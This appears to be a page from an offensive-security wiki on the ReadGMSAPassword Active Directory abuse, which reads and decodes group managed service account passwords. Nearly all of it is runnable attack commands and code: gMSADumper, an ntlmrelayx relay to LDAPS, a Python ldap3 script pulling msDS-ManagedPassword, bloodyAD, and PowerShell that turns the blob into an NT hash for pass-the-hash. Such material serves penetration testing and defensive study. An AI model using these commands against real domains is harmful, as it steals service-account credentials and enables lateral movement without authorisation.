---
authors: CravateRouge, PfiatDe, ShutdownRepo
category: ad
---

# ReadGMSAPassword

This abuse stands out a bit from other abuse cases. It can be carried out when controlling an object that has enough permissions listed in the target gMSA account's `msDS-GroupMSAMembership` attribute's DACL. Usually, these objects are principals that were configured to be explictly allowed to use the gMSA account.

The attacker can then read the gMSA (group managed service accounts) password of the account if those requirements are met.

::: tabs

=== UNIX-like

On UNIX-like systems, [gMSADumper](https://github.com/micahvandeusen/gMSADumper) (Python) can be used to read and decode gMSA passwords. It supports cleartext NTLM, pass-the-hash and Kerberoas authentications.

```bash
gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
```



**Alternative 1**: Impacket's [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) tool can be used to read and decode gMSA passwords. :warning: Some tests showed ntlmrelayx missed entries gMSADumper didn't.

```bash
ntlmrelayx.py -t ldaps://10.0.0.5 -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs 
```

> [!TIP]
> In order to easily fake a relayed authentication, once the relay servers are up and running, the tester can browse [http://127.0.0.1/](http://127.0.0.1/) in order to trigger a basic authentication that will then be relayed by ntlmrelayx, like [this](https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96).

---
**Alternative 2**: The `msDS-ManagedPassword` attribute can also be manually obtained by running the following Python script. The [following Python code](https://github.com/SecureAuthCorp/impacket/blob/3f3002e1c1dd78a5ee6100d6824ff7b65bbb92b6/impacket/examples/ntlmrelayx/attacks/ldapattack.py#L672-L702) can then be used to decode the blob.

```python
import ldap3
target_dn = "" # something like 'CN=Target User,OU=Standard Accounts,DC=domain,DC=local'
domain = "domain"
username = "username"
user = "{}\\{}".format(domain, username)
password = "password"
server = ldap3.Server(domain)
connection = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)
connection.bind()
connection.search(target_dn, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
print(connection.entries)
```
---
**Alternative 3**: Using [bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object $TargetObject --attr msDS-ManagedPassword
```


=== Windows

On Windows systems, there are multiple ways to read gMSA passwords.

The first one uses the Active Directory and DSInternals PowerShell modules.

```bash
# Save the blob to a variable
$gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

# Decode the data structure using the DSInternals module
ConvertFrom-ADManagedPasswordBlob $mp
# Build a NT-Hash for PTH
(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
# Alterantive: build a Credential-Object with the Plain Password
$cred = new-object system.management.automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```

The second one relies on [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) (C#).

```bash
.\GMSAPasswordReader.exe --AccountName 'Target_Account'
```


:::


## Resources

[https://cube0x0.github.io/Relaying-for-gMSA/](https://cube0x0.github.io/Relaying-for-gMSA/)